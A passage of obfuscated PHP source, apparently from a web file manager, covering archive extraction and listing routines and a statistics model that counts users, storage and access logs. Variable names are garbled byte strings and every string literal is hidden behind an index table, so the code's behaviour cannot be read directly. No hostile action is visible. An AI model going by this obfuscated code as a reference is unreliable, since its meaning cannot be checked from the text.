$™²ÍÅ·Õ, $—ˆÓ¢Ó°); if ($ö‰¤üèÔ) { del_dir($ö‰¤üèÔ); } if (!$¶Ë¹ÇÖ—) { write_log($Ñ½ªÃ—é[1290] . $¶Ë¹ÇÖ— . $Ñ½ªÃ—é[1291] . $™²ÍÅ·Õ, $Ñ½ªÃ—é[399]); show_json(LNG($Ñ½ªÃ—é[1289]), !1); } return $†¯¡¬úê; } public static function unzip($Á÷ÒãˆÖ, $ıÛÔ‹Ìñ, $ƒ«…ˆØ = "\55\x31", $ùÖ˜Ü¤‚ = "\x72\x65\x70\x6c\x61\143\145") { $éÜ¥ß¼¿ =& $_SERVER[É¨™èà]; $ù•şıÜÃ = parent::info($Á÷ÒãˆÖ); if (!$ù•şıÜÃ) { show_json(LNG($éÜ¥ß¼¿[1292]), !1); } $ûÖäÑ÷£ = IO::infoFullSimple($ıÛÔ‹Ìñ); if (!$ûÖäÑ÷£) { $ıÛÔ‹Ìñ = IO::mkdir($ıÛÔ‹Ìñ); } if (isset($ûÖäÑ÷£[$éÜ¥ß¼¿[194]]) && trim($ûÖäÑ÷£[$éÜ¥ß¼¿[87]], $éÜ¥ß¼¿[8]) != trim($ıÛÔ‹Ìñ, $éÜ¥ß¼¿[8])) { $·ş·µ¼¸ = KodIO::make($ûÖäÑ÷£[$éÜ¥ß¼¿[193]]); $¦°ªÒìŒ = IO::fileNameAuto($·ş·µ¼¸, $ûÖäÑ÷£[$éÜ¥ß¼¿[32]], REPEAT_RENAME_FOLDER, !0); $ıÛÔ‹Ìñ = IO::mkdir($·ş·µ¼¸ . $¦°ªÒìŒ); } $ƒ«…ˆØ = $ƒ«…ˆØ && $ƒ«…ˆØ != $éÜ¥ß¼¿[1293] ? @json_decode($ƒ«…ˆØ, !0) : -1; $èæ™§—û = self::unzipPart($Á÷ÒãˆÖ, $ƒ«…ˆØ); if (!$èæ™§—û || !IO::exist($èæ™§—û[$éÜ¥ß¼¿[233]])) { show_json(LNG($éÜ¥ß¼¿[108]), !1); } $Ä›Æ®‚Â = $èæ™§—û[$éÜ¥ß¼¿[1294]][count($èæ™§—û[$éÜ¥ß¼¿[1294]]) - 1]; if ($Ä›Æ®‚Â[$éÜ¥ß¼¿[1295]] == -1 || substr($Ä›Æ®‚Â[$éÜ¥ß¼¿[32]], -1, 1) == $éÜ¥ß¼¿[8]) { $¨¯•Ë¶  = $èæ™§—û[$éÜ¥ß¼¿[1296]] . rand_string(10) . $éÜ¥ß¼¿[8]; mk_dir($¨¯•Ë¶ ); $íÁ”Íñ² = count($èæ™§—û[$éÜ¥ß¼¿[1294]]) == 1 ? IO::ext($Á÷ÒãˆÖ) : get_path_ext($èæ™§—û[$éÜ¥ß¼¿[233]]); $×ş‹Üğ‚ = KodArchive::extract(self::iconvSystem($èæ™§—û[$éÜ¥ß¼¿[233]]), $¨¯•Ë¶ , $Ä›Æ®‚Â[$éÜ¥ß¼¿[1295]], $¦°ªÒìŒ, $íÁ”Íñ²); self::unzipErrorCheck($×ş‹Üğ‚, array($éÜ¥ß¼¿[1297], $Á÷ÒãˆÖ, $íÁ”Íñ², $ıÛÔ‹Ìñ, $èæ™§—û)); Hook::trigger($éÜ¥ß¼¿[1298], $¨¯•Ë¶ ); recursion_dir($¨¯•Ë¶ , $„›Îå®, $°öÁÅÏÚ, 0); $¶ı´¶®¤ = array_merge($„›Îå®, $°öÁÅÏÚ); $óõø¥ÂÔ = array(); foreach ($¶ı´¶®¤ as $“Øˆ¼º) { $œŒ‘ïíå = IO::move(self::iconvApp($“Øˆ¼º), $ıÛÔ‹Ìñ, $ùÖ˜Ü¤‚); if ($œŒ‘ïíå) { $óõø¥ÂÔ[] = $œŒ‘ïíå; } } del_dir($¨¯•Ë¶ ); } else { $œŒ‘ïíå = IO::move($èæ™§—û[$éÜ¥ß¼¿[233]], $ıÛÔ‹Ìñ, $ùÖ˜Ü¤‚, get_path_this($Ä›Æ®‚Â[$éÜ¥ß¼¿[32]])); if ($œŒ‘ïíå) { $óõø¥ÂÔ[] = $œŒ‘ïíå; } } return $óõø¥ÂÔ ? $óõø¥ÂÔ : !1; } public static function unzipList($ù¦”İ™Ç) { $¿€ Œƒ© =& $_SERVER[É¨™èà]; $˜Ø•®¥Í = isset($ù¦”İ™Ç[$¿€ Œƒ©[1299]]) ? $ù¦”İ™Ç[$¿€ Œƒ©[1299]] : !1; $¿ò¬÷ÕĞ = isset($ù¦”İ™Ç[$¿€ Œƒ©[1295]]) ? @json_decode($ù¦”İ™Ç[$¿€ Œƒ©[1295]], !0) : -1; $ß»²Ê¨È = self::unzipPart($ù¦”İ™Ç[$¿€ Œƒ©[87]], $¿ò¬÷ÕĞ); if (!$ß»²Ê¨È || !IO::exist($ß»²Ê¨È[$¿€ Œƒ©[233]])) { show_json(LNG($¿€ Œƒ©[108]), !1); } $ŠÑ­¬Õ¸ = $ß»²Ê¨È[$¿€ Œƒ©[1294]][count($ß»²Ê¨È[$¿€ Œƒ©[1294]]) - 1]; $“‹É´ÏÆ = in_array(IO::ext($ß»²Ê¨È[$¿€ Œƒ©[233]]), array($¿€ Œƒ©[399], $¿€ Œƒ©[1300], $¿€ Œƒ©[1301], $¿€ Œƒ©[1302], $¿€ Œƒ©[1303], $¿€ Œƒ©[1304])); if (!$˜Ø•®¥Í && ($ŠÑ­¬Õ¸[$¿€ Œƒ©[1295]] == -1 || $“‹É´ÏÆ)) { $ççÃÉ­  = $ß»²Ê¨È[$¿€ Œƒ©[1296]] . get_path_this($ß»²Ê¨È[$¿€ Œƒ©[233]]) . $¿€ Œƒ©[1305]; if (!IO::exist($ççÃÉ­ )) { $Ç©ÀÏ± = $ŠÑ­¬Õ¸[$¿€ Œƒ©[1295]] == -1 ? get_path_ext(IO::pathThis($ù¦”İ™Ç[$¿€ Œƒ©[87]])) : get_path_ext($ß»²Ê¨È[$¿€ Œƒ©[233]]); $˜¼•ÂÙğ = KodArchive::listContent(self::iconvSystem($ß»²Ê¨È[$¿€ Œƒ©[233]]), !0, $Ç©ÀÏ±); self::unzipErrorCheck($˜¼•ÂÙğ, array($¿€ Œƒ©[1306], $ù¦”İ™Ç, $ß»²Ê¨È)); @file_put_contents($ççÃÉ­ , json_encode($˜¼•ÂÙğ[$¿€ Œƒ©[1307]])); } return @json_decode(IO::getContent($ççÃÉ­ ), !0); } IO::fileOut($ß»²Ê¨È[$¿€ Œƒ©[233]], $˜Ø•®¥Í, get_path_this($ŠÑ­¬Õ¸[$¿€ Œƒ©[32]])); die; } private static function zipFileList($²’Òà¦¹, $¬ÁİÁÙ = false) { $ùŒ¬°… =& $_SERVER[É¨™èà]; $°Ì—Ù = array(); foreach ($²’Òà¦¹ as $Ö¼¢½) { $æ§—éö› = $Ö¼¢½[$ùŒ¬°…[87]]; if ($¬ÁİÁÙ) { $æ§—éö› = self::copy($Ö¼¢½[$ùŒ¬°…[87]], $¬ÁİÁÙ, $ùŒ¬°…[915]); } else { $Ï›¯²°Ñ = self::init($Ö¼¢½[$ùŒ¬°…[87]]); if ($Ï›¯²°Ñ->getType() == $ùŒ¬°…[109]) { $æ§—éö› = $Ï›¯²°Ñ->path; } } if ($æ§—éö› && self::local()->exist($æ§—éö›)) { $°Ì—Ù[$Ö¼¢½[$ùŒ¬°…[87]]] = $æ§—éö›; } } if (!empty($°Ì—Ù)) { return array_values($°Ì—Ù); } show_json(LNG($ùŒ¬°…[1264]), !1); } private static function localFilePath($ñÆ¤§á) { $­è±íÛÅ =& $_SERVER[É¨™èà]; $‘û¬ÃÖß = KodIO::parse($ñÆ¤§á); if ($‘û¬ÃÖß[$­è±íÛÅ[33]] == KodIO::KOD_SOURCE) { $“È¨‡Ïê = Model($­è±íÛÅ[921])->fileInfoGet(KodIO::sourceID($ñÆ¤§á)); if (!$“È¨‡Ïê[$­è±íÛÅ[87]]) { show_json($­è±íÛÅ[1308], !1); } $ñÆ¤§á = $“È¨‡Ïê[$­è±íÛÅ[87]]; } $ä¶Ìì»Ş = self::init($ñÆ¤§á); if ($ä¶Ìì»Ş->pathParse[$­è±íÛÅ[1250]]) { $ñÆ¤§á = $ä¶Ìì»Ş->pathParse[$­è±íÛÅ[1250]]; $ä¶Ìì»Ş = self::init($ñÆ¤§á); } $»µ‚“·÷ = $ä¶Ìì»Ş->getType(); if ($»µ‚“·÷ == $­è±íÛÅ[109] || $»µ‚“·÷ == $­è±íÛÅ[1309]) { if (!$ä¶Ìì»Ş->exist($ä¶Ìì»Ş->path)) { show_json(LNG($­è±íÛÅ[108]), !1); } return $ä¶Ìì»Ş->path; } return !1; } public static function unzipPart($¬Ğü³¨…, $›¿·€µ’ = -1) { $à××ûõ =& $_SERVER[É¨™èà]; $¡Îà Ø‰ = IO::pathThis($¬Ğü³¨…); if (!$›¿·€µ’ || $›¿·€µ’ == -1) { $¦œÃĞ« = array(array($à××ûõ[32] => $¡Îà Ø‰, $à××ûõ[1295] => -1)); $¦œÃĞ«[0][$à××ûõ[1310]] = $¦œÃĞ«[0][$à××ûõ[32]]; } else { if (is_array($›¿·€µ’)) { $¦œÃĞ« = $›¿·€µ’; $¥ÍŞÎŒÍ = count($¦œÃĞ«) - 1; for ($ôä¯Øñ› = 0; $ôä¯Øñ› <= $¥ÍŞÎŒÍ; $ôä¯Øñ›++) { $œÕ¡ö“ = $¦œÃĞ«[$ôä¯Øñ›]; $ê‰’™ñô = get_path_this($œÕ¡ö“[$à××ûõ[32]]) . (checkExtSafe($œÕ¡ö“[$à××ûõ[32]]) ? $à××ûõ[12] : $à××ûõ[1311]); $¦œÃĞ«[$ôä¯Øñ›][$à××ûõ[1310]] = $à××ûõ[1312] . intval($œÕ¡ö“[$à××ûõ[1295]]) . $à××ûõ[472] . $ê‰’™ñô; if ($ôä¯Øñ› == 0) { continue; } $¦œÃĞ«[$ôä¯Øñ›][$à××ûõ[1310]] = $¦œÃĞ«[$ôä¯Øñ› - 1][$à××ûõ[1310]] . $à××ûõ[1313] . $¦œÃĞ«[$ôä¯Øñ›][$à××ûõ[1310]]; } } } if (!is_array($¦œÃĞ«) || count($¦œÃĞ«) == 0) { return !1; } $ğ«Ş×¶ = $¦œÃĞ«[count($¦œÃĞ«) - 1]; if (!IO::exist($¬Ğü³¨…)) { return !1; } $Ÿğ¬©å– = TEMP_FILES . $à××ûõ[1314] . kodIO::hashPathSafe($¬Ğü³¨…) . $à××ûõ[8]; $—™ƒÛÕï = $Ÿğ¬©å– . $ğ«Ş×¶[$à××ûõ[1310]]; mk_dir($Ÿğ¬©å–); file_put_contents(TEMP_FILES . $à××ûõ[1286], $à××ûõ[12]); if (IO::exist($—™ƒÛÕï)) { return array($à××ûõ[233] => $—™ƒÛÕï, $à××ûõ[1294] => $¦œÃĞ«, $à××ûõ[1296] => $Ÿğ¬©å–); } $ÔÏıÆ = self::localFilePath($¬Ğü³¨…); if (!$ÔÏıÆ) { $ÔÏıÆ = $Ÿğ¬©å– . $à××ûõ[1315]; if (!IO::exist($ÔÏıÆ)) { self::copy($¬Ğü³¨…, $Ÿğ¬©å–, !1, get_path_this($ÔÏıÆ)); } } if (!$ÔÏıÆ || !IO::exist($ÔÏıÆ)) { return !1; } if ($ğ«Ş×¶[$à××ûõ[1295]] == -1) { return array($à××ûõ[233] => $ÔÏıÆ, $à××ûõ[1294] => $¦œÃĞ«, $à××ûõ[1296] => $Ÿğ¬©å–); } $èµºµ™« = $ÔÏıÆ; foreach ($¦œÃĞ« as $ôä¯Øñ› => $œÕ¡ö“) { if (!$œÕ¡ö“ || $œÕ¡ö“[$à××ûõ[1295]] == $à××ûõ[1293]) { break; } if (substr($œÕ¡ö“[$à××ûõ[32]], -1, 1) == $à××ûõ[8]) { break; } $»‹å‘ñ = in_array(get_path_ext($œÕ¡ö“[$à××ûõ[1310]]), array($à××ûõ[399], $à××ûõ[1300], $à××ûõ[1301], $à××ûõ[1302], $à××ûõ[1303], $à××ûõ[1304])); $™ÌşöÄ = $ôä¯Øñ› == count($¦œÃĞ«) - 1 && $»‹å‘ñ; $ÖªòîÍ© = $Ÿğ¬©å– . $œÕ¡ö“[$à××ûõ[1310]]; $üÖö¼ğß = $Ÿğ¬©å– . get_path_this($œÕ¡ö“[$à××ûõ[32]]); if (IO::exist($ÖªòîÍ©)) { $èµºµ™« = $ÖªòîÍ©; continue; } $ü­ùÃ×Û = $ôä¯Øñ› == 0 ? get_path_ext($¡Îà Ø‰) : get_path_ext($èµºµ™«); $Ü¥’€Å = KodArchive::extract(self::iconvSystem($èµºµ™«), $Ÿğ¬©å–, $œÕ¡ö“[$à××ûõ[1295]], $çÎÈÖò, $ü­ùÃ×Û); self::unzipErrorCheck($Ü¥’€Å, array($à××ûõ[1316], $¬Ğü³¨…, $¦œÃĞ«, $œÕ¡ö“, $ÖªòîÍ©)); if (IO::exist($üÖö¼ğß)) { IO::rename($üÖö¼ğß, get_path_this($ÖªòîÍ©)); } $èµºµ™« = $ÖªòîÍ©; } $—™ƒÛÕï = $èµºµ™«; return array($à××ûõ[233] => $èµºµ™«, $à××ûõ[1294] => $¦œÃĞ«, $à××ûõ[1296] => $Ÿğ¬©å–); } private static function unzipErrorCheck($ï¥ò¶Á—, $Õ”œõá = false) { $›ÔœÊÌ“ =& $_SERVER[É¨™èà]; if ($ï¥ò¶Á—[$›ÔœÊÌ“[1317]]) { return !0; } write_log(array($›ÔœÊÌ“[1318], $ï¥ò¶Á—, $Õ”œõá), $›ÔœÊÌ“[1319]); $«°µºïÂ = is_array($ï¥ò¶Á—[$›ÔœÊÌ“[1307]]) ? json_encode($ï¥ò¶Á—[$›ÔœÊÌ“[1307]]) : $ï¥ò¶Á—[$›ÔœÊÌ“[1307]]; show_json($›ÔœÊÌ“[1320] . $«°µºïÂ, !1); die; } } goto E²£Àê¤ĞÑ; côêÂ½ˆá¨: class AnalysisModel extends ModelBaseLight { public function init($—«ËšÏ¯) { $ƒà°ìÜœ =& $_SERVER[É¨™èà]; $ƒí„”áµ = array($ƒà°ìÜœ[677] => array($ƒà°ìÜœ[33] => $ƒà°ìÜœ[1929], $ƒà°ìÜœ[362] => array($ƒà°ìÜœ[285], $ƒà°ìÜœ[856], $ƒà°ìÜœ[1930], $ƒà°ìÜœ[1931])), $ƒà°ìÜœ[1932] => array($ƒà°ìÜœ[33] => $ƒà°ìÜœ[1933], $ƒà°ìÜœ[362] => array($ƒà°ìÜœ[285], $ƒà°ìÜœ[854], $ƒà°ìÜœ[1934], $ƒà°ìÜœ[1935], $ƒà°ìÜœ[1936]))); if (!isset($ƒí„”áµ[$—«ËšÏ¯])) { return !1; } $this->optionType = $ƒí„”áµ[$—«ËšÏ¯][$ƒà°ìÜœ[33]]; $this->field = $ƒí„”áµ[$—«ËšÏ¯][$ƒà°ìÜœ[362]]; return !0; } public function listData($˜Â ¹ØÌ = false, $â±÷ É· = "\155\x6f\144\x69\x66\171\x54\x69\155\145", $°­Ä¥èŠ = false) { return parent::listData($˜Â ¹ØÌ, $â±÷ É·, $°­Ä¥èŠ); } public function trendList($©¦£ˆ†å) { $ÔÜ™” =& $_SERVER[É¨™èà]; $©ëŞ½èÖ = $this->listData(); if ($©ëŞ½èÖ) { $ªºÚÁ¶Ö = end($©ëŞ½èÖ); $É¯ÄìÎ· = date($ÔÜ™”[1937], strtotime($ÔÜ™”[1938])); if ($ªºÚÁ¶Ö[$ÔÜ™”[285]] == $É¯ÄìÎ·) { return $©ëŞ½èÖ; } $ãÓ¶ü²‡ = strtotime($ªºÚÁ¶Ö[$ÔÜ™”[285]]); } if (!isset($ãÓ¶ü²‡)) { $À¦Ï—¤é = $©¦£ˆ†å == $ÔÜ™”[677] ? $ÔÜ™”[609] : $ÔÜ™”[921]; $ãÓ¶ü²‡ = Model($À¦Ï—¤é)->min($ÔÜ™”[234]); } $½³×Ç‡õ = $ÔÜ™”[1939] . ucfirst($©¦£ˆ†å); $Í×ºÓüæ = $this->dateList($ãÓ¶ü²‡); foreach ($Í×ºÓüæ as $É¯ÄìÎ·) { $this->{$½³×Ç‡õ}($É¯ÄìÎ·); } return $this->listData(); } private function dateList($Ÿ‹«¼) { $ÊöÊ÷Á» =& $_SERVER[É¨™èà]; $­¼ùùÌ = $Ÿ‹«¼; $è¦š—… = strtotime($ÊöÊ÷Á»[1938]); $È°®‰âˆ = array(); while ($­¼ùùÌ <= $è¦š—…) { $È°®‰âˆ[] = date($ÊöÊ÷Á»[1937], $­¼ùùÌ); $­¼ùùÌ = strtotime($ÊöÊ÷Á»[1940], $­¼ùùÌ); } return $È°®‰âˆ; } public function _recordUser($íÚ¸Ÿœï = '') { $²Š®íÜ¬ =& $_SERVER[É¨™èà]; $’·ûó¾ = strtotime(date($²Š®íÜ¬[1941], strtotime($íÚ¸Ÿœï))); $”˜—ìƒŸ = strtotime(date($²Š®íÜ¬[1942], strtotime($íÚ¸Ÿœï))); $›×–ˆıÇ = array($²Š®íÜ¬[234] => array($²Š®íÜ¬[1107], $”˜—ìƒŸ)); $å¡°ü = Model($²Š®íÜ¬[609])->where($›×–ˆıÇ)->count($²Š®íÜ¬[1800]); $›×–ˆıÇ[$²Š®íÜ¬[234]] = array($²Š®íÜ¬[419], array($’·ûó¾, $”˜—ìƒŸ)); $íá½Ú¿¿ = Model($²Š®íÜ¬[609])->where($›×–ˆıÇ)->count($²Š®íÜ¬[1800]); $›×–ˆıÇ[$²Š®íÜ¬[33]] = $²Š®íÜ¬[1943]; $ÊïãÇ˜Ğ = Model($²Š®íÜ¬[1944])->where($›×–ˆıÇ)->count($²Š®íÜ¬[1945]); $Ÿ‰·ã = array($²Š®íÜ¬[285] => $íÚ¸Ÿœï, $²Š®íÜ¬[856] => (int) $å¡°ü, $²Š®íÜ¬[1930] => (int) $íá½Ú¿¿, $²Š®íÜ¬[1931] => (int) $ÊïãÇ˜Ğ); return $this->insert($Ÿ‰·ã); } public function _recordStore($³š“«˜ä = '') { $û¸×¨íå =& $_SERVER[É¨™èà]; $“œ®¹ã÷ = strtotime(date($û¸×¨íå[1942], strtotime($³š“«˜ä))); $óÜˆó™ = array($û¸×¨íå[234] => array($û¸×¨íå[1107], $“œ®¹ã÷)); $™£½™Ã° = Model($û¸×¨íå[556])->where($óÜˆó™)->sum($û¸×¨íå[79]); $óÜˆó™[$û¸×¨íå[495]] = 0; $Î¬·åü = Model($û¸×¨íå[921])->where($óÜˆó™)->sum($û¸×¨íå[79]); $óÜˆó™[$û¸×¨íå[191]] = 1; $éŠÜ«ÇÛ = Model($û¸×¨íå[921])->where($óÜˆó™)->sum($û¸×¨íå[79]); $óÜˆó™[$û¸×¨íå[191]] = 2; $¡Ìü®»ƒ = Model($û¸×¨íå[921])->where($óÜˆó™)->sum($û¸×¨íå[79]); $õÌ¯ôµ× = array($û¸×¨íå[285] => $³š“«˜ä, $û¸×¨íå[854] => (int) $Î¬·åü, $û¸×¨íå[1934] => (int) $™£½™Ã°, $û¸×¨íå[1935] => (int) $éŠÜ«ÇÛ, $û¸×¨íå[1936] => (int) $¡Ìü®»ƒ); return $this->insert($õÌ¯ôµ×); } public function trend($Ê†²ñ×, $Ñ–óÎ”­) { $§ÚùÃî‡ =& $_SERVER[É¨™èà]; if (!$this->init($Ê†²ñ×)) { return !1; } $Áıù×şğ = $this->trendList($Ê†²ñ×); if ($Áıù×şğ && $Ñ–óÎ”­ != $§ÚùÃî‡[1772]) { $² ‡¥¬Å = $Áıù×şğ[0][$§ÚùÃî‡[285]]; $ÜÆ³­– = $this->validDate($Ñ–óÎ”­, $² ‡¥¬Å); $ˆÕ—çğ = array(); $°ıËÆ§Ä = array_to_keyvalue($Áıù×şğ, $§ÚùÃî‡[285]); foreach ($ÜÆ³­– as $ÅÁåıâ) { if (isset($°ıËÆ§Ä[$ÅÁåıâ])) { $Õ…ğ—·Ø = $°ıËÆ§Ä[$ÅÁåıâ]; } else { $Õ…ğ—·Ø = end($Áıù×şğ); $Õ…ğ—·Ø[$§ÚùÃî‡[285]] = $ÅÁåıâ; if ($Ê†²ñ× == $§ÚùÃî‡[677]) { $Õ…ğ—·Ø[$§ÚùÃî‡[1930]] = $Õ…ğ—·Ø[$§ÚùÃî‡[1931]] = 0; } } $ˆÕ—çğ[] = $Õ…ğ—·Ø; } $Áıù×şğ = $ˆÕ—çğ; } $ÍøñÆ‚ = array($§ÚùÃî‡[677] => array($§ÚùÃî‡[856] => LNG($§ÚùÃî‡[1946]), $§ÚùÃî‡[1930] => LNG($§ÚùÃî‡[1947]), $§ÚùÃî‡[1931] => LNG($§ÚùÃî‡[1948])), $§ÚùÃî‡[1932] => array($§ÚùÃî‡[854] => LNG($§ÚùÃî‡[1949]), $§ÚùÃî‡[1934] => LNG($§ÚùÃî‡[1950]), $§ÚùÃî‡[1935] => LNG($§ÚùÃî‡[1951]), $§ÚùÃî‡[1936] => LNG($§ÚùÃî‡[1952]))); $à•¨‹Ãº = array($§ÚùÃî‡[677] => $§ÚùÃî‡[1953], $§ÚùÃî‡[1932] => $§ÚùÃî‡[79]); if (empty($Áıù×şğ)) { $ÅÁåıâ = date($§ÚùÃî‡[1937], strtotime($§ÚùÃî‡[1938])); $ùğåè© = array($§ÚùÃî‡[285] => $ÅÁåıâ); foreach ($ÍøñÆ‚[$Ê†²ñ×] as $›Ôğ¤º => $¶ÒŸÔ¨Ş) { $ùğåè©[$›Ôğ¤º] = 0; } $Áıù×şğ[] = $ùğåè©; } $ı¢åâ½ş = array(); foreach ($Áıù×şğ as $¶ÒŸÔ¨Ş) { if ($Ê†²ñ× == $§ÚùÃî‡[1932] && $¶ÒŸÔ¨Ş[$§ÚùÃî‡[1934]] > $¶ÒŸÔ¨Ş[$§ÚùÃî‡[854]]) { $¶ÒŸÔ¨Ş[$§ÚùÃî‡[1934]] = $¶ÒŸÔ¨Ş[$§ÚùÃî‡[854]]; } foreach ($ÍøñÆ‚[$Ê†²ñ×] as $›Ôğ¤º => $à”İÊ÷Õ) { $Õ…ğ—·Ø = array($§ÚùÃî‡[285] => $¶ÒŸÔ¨Ş[$§ÚùÃî‡[285]], $§ÚùÃî‡[1687] => $à”İÊ÷Õ); $Õ…ğ—·Ø[$à•¨‹Ãº[$Ê†²ñ×]] = isset($¶ÒŸÔ¨Ş[$›Ôğ¤º]) ? $¶ÒŸÔ¨Ş[$›Ôğ¤º] : 0; $ı¢åâ½ş[] = $Õ…ğ—·Ø; } } return $ı¢åâ½ş; } public function validDate($ ¡Òø„Ï, $Ö¨¨¤í˜) { $‚ÁÎœ¼˜ =& $_SERVER[É¨™èà]; $ÆÙ‡Æ = date($‚ÁÎœ¼˜[1937], strtotime($‚ÁÎœ¼˜[1938])); $üäğå¡š = array($ÆÙ‡Æ); switch ($ ¡Òø„Ï) { case $‚ÁÎœ¼˜[1779]: $ÖøÚ‡Á = mktime(0, 0, 0, date($‚ÁÎœ¼˜[1954]), date($‚ÁÎœ¼˜[1480]) - date($‚ÁÎœ¼˜[1569]) + 7 - 7, date($‚ÁÎœ¼˜[1955])); $Ã£¬ı„í = 0; do { $îŒúªè = date($‚ÁÎœ¼˜[1937], $ÖøÚ‡Á - 3600 * 24 * 7 * $Ã£¬ı„í); $üäğå¡š[] = $îŒúªè; $Ã£¬ı„í++; } while ($Ö¨¨¤í˜ < $îŒúªè); break; case $‚ÁÎœ¼˜[1777]: $Ã£¬ı„í = 1; do { $Šïµ÷¹‚ = date($‚ÁÎœ¼˜[1956], strtotime("\x2d\40{$Ã£¬ı„í}\40\x6d\157\156\164\150\163")); $üäğå¡š[] = $Šïµ÷¹‚; $Ã£¬ı„í++; } while ($Ö¨¨¤í˜ < $Šïµ÷¹‚); break; case $‚ÁÎœ¼˜[1957]: $öºŸòÊ = (int) date($‚ÁÎœ¼˜[1955], strtotime($Ö¨¨¤í˜)); $‡³¬á¶ = (int) date($‚ÁÎœ¼˜[1955]); if ($öºŸòÊ >= $‡³¬á¶) { break; } for ($öºŸòÊ; $öºŸòÊ < $‡³¬á¶; $öºŸòÊ++) { $üäğå¡š[] = $öºŸòÊ . $‚ÁÎœ¼˜[1958]; } break; default: break; } if ($Ö¨¨¤í˜ > end($üäğå¡š)) { array_pop($üäğå¡š); } sort($üäğå¡š); return $üäğå¡š; } public function listTable($„ğé«Î¥) { $£’àØ‰‘ = ucfirst($„ğé«Î¥); return Model($£’àØ‰‘)->listData(); } public function option($İíËöìœ) { $ò÷Ó¡”© = $_SERVER[É¨™èà][1959] . ucfirst($İíËöìœ); return $this->{$ò÷Ó¡”©}(); } private function optionUser() { $É½…µ¿” =& $_SERVER[É¨™èà]; $§×á·Ò = Model($É½…µ¿”[609])->count($É½…µ¿”[1800]); $»Ø²ãÎÀ = Model($É½…µ¿”[609])->where($É½…µ¿”[1960])->count($É½…µ¿”[1800]); $ı­åÊ÷‡ = intval($GLOBALS[$É½…µ¿”[6]][$É½…µ¿”[435]][$É½…µ¿”[1745]]) / 3600; $ĞÜğá¸ = strtotime("\55{$ı­åÊ÷‡}\40\150\x6f\165\162\163"); $éö¤ƒ®‘ = strtotime(date($É½…µ¿”[1941])); if ($ĞÜğá¸ < $éö¤ƒ®‘) { $ĞÜğá¸ = $éö¤ƒ®‘; } $²’ÈÒì = array($É½…µ¿”[1961] => array($É½…µ¿”[1108], $ĞÜğá¸)); $ÍØ¿âÂ¿ = (int) Model($É½…µ¿”[609])->where($²’ÈÒì)->count($É½…µ¿”[1800]); if (!$ÍØ¿âÂ¿) { $ÍØ¿âÂ¿ = 1; } $²’ÈÒì = array($É½…µ¿”[1961] => array($É½…µ¿”[1108], $éö¤ƒ®‘)); $ÏÍ÷åä– = Model($É½…µ¿”[609])->where($²’ÈÒì)->count($É½…µ¿”[1800]); return array($É½…µ¿”[849] => (int) $§×á·Ò, $É½…µ¿”[1962] => (int) ($§×á·Ò - $»Ø²ãÎÀ), $É½…µ¿”[1963] => (int) $»Ø²ãÎÀ, $É½…µ¿”[1964] => (int) $ÏÍ÷åä–, $É½…µ¿”[1965] => $ÍØ¿âÂ¿); } private function optionFile() { $ÇË¯™ó =& $_SERVER[É¨™èà]; $»ÄœÃ³ = $this->sourceSize(); $ñù¬­¥ = $»ÄœÃ³[$ÇË¯™ó[79]]; $Š»íÏìÌ = $»ÄœÃ³[$ÇË¯™ó[1934]]; $‘äÃÈ¤· = Model($ÇË¯™ó[921])->where(array($ÇË¯™ó[495] => 0))->count($ÇË¯™ó[194]); $ÕÊŒ¨åÊ = array($ÇË¯™ó[495] => 0, $ÇË¯™ó[234] => array($ÇË¯™ó[1108], strtotime(date($ÇË¯™ó[1941])))); $ÔÅØ·ÎĞ = Model($ÇË¯™ó[921])->where($ÕÊŒ¨åÊ)->sum($ÇË¯™ó[79]); $÷ÕãÏâ = Model($ÇË¯™ó[921])->where($ÕÊŒ¨åÊ)->count($ÇË¯™ó[194]); return array($ÇË¯™ó[854] => $ñù¬­¥, $ÇË¯™ó[1934] => $Š»íÏìÌ, $ÇË¯™ó[1966] => $ñù¬­¥ - $Š»íÏìÌ, $ÇË¯™ó[1967] => (int) $ÔÅØ·ÎĞ, $ÇË¯™ó[856] => (int) $‘äÃÈ¤·, $ÇË¯™ó[1968] => (int) $÷ÕãÏâ); } private function optionAccess() { $ëû¬ĞõÂ =& $_SERVER[É¨™èà]; return array($ëû¬ĞõÂ[849] => $this->typeLogCnt(), $ëû¬ĞõÂ[110] => $this->typeLogCnt($ëû¬ĞõÂ[110]), $ëû¬ĞõÂ[535] => $this->typeLogCnt($ëû¬ĞõÂ[535]), $ëû¬ĞõÂ[1247] => $this->typeLogCnt($ëû¬ĞõÂ[1247]), $ëû¬ĞõÂ[1969] => $this->typeLogCnt($ëû¬ĞõÂ[1969]), $ëû¬ĞõÂ[677] => $this->typeLogCnt($ëû¬ĞõÂ[12], $ëû¬ĞõÂ[1945])); } private function typeLogCnt($à¼ø—şì = '', $áéŒ¡ñğ = "\151\144") { $Ç¬·öÂ =& $_SERVER[É¨™èà]; $ƒ’ÕÕ¸œ = array($Ç¬·öÂ[110] => array($Ç¬·öÂ[1970], $Ç¬·öÂ[1971]), $Ç¬·öÂ[535] => array($Ç¬·öÂ[1972], $Ç¬·öÂ[1973]), $Ç¬·öÂ[1247] => array($Ç¬·öÂ[1974], $Ç¬·öÂ[1975], $Ç¬·öÂ[1976]), $Ç¬·öÂ[1969] => array($Ç¬·öÂ[1977], $Ç¬·öÂ[1978]), $Ç¬·öÂ[1979] => array($Ç¬·öÂ[1980], $Ç¬·öÂ[1981], $Ç¬·öÂ[1982])); $“ÒÈ¡îİ = strtotime(date($Ç¬·öÂ[1941])); $ƒºÉÛõä = array($Ç¬·öÂ[234] => array($Ç¬·öÂ[1108], $“ÒÈ¡îİ)); if ($à¼ø—şì) { $ƒºÉÛõä[$Ç¬·öÂ[33]] = array($Ç¬·öÂ[7], $ƒ’ÕÕ¸œ[$à¼ø—şì]); } $Ù©¨¦ = Model($Ç¬·öÂ[1944])->where($ƒºÉÛõä)->count($áéŒ¡ñğ); return (int) $Ù©¨¦; } private function optionServer() { $ÙÓ£¨ü¼ =& $_SERVER[É¨™èà]; $ÔèŠÍË¶ = $this->diskDriver(); $Öš†¢„ = KodIO::defaultDriver(); $÷äáŞñ« = array($ÙÓ£¨ü¼[914] => $Öš†¢„[$ÙÓ£¨ü¼[485]]); $¿¿Œó¥ç = Model($ÙÓ£¨ü¼[556])->where($÷äáŞñ«)->sum($ÙÓ£¨ü¼[79]); $¡·’Çæ£ = explode($ÙÓ£¨ü¼[53], $_SERVER[$ÙÓ£¨ü¼[147]]); $ÃŒë²÷ = $¡·’Çæ£[0]; $ÀÃİ€’Û = $GLOBALS[$ÙÓ£¨ü¼[6]][$ÙÓ£¨ü¼[21]]; $Œ¦¾¿Ùü = 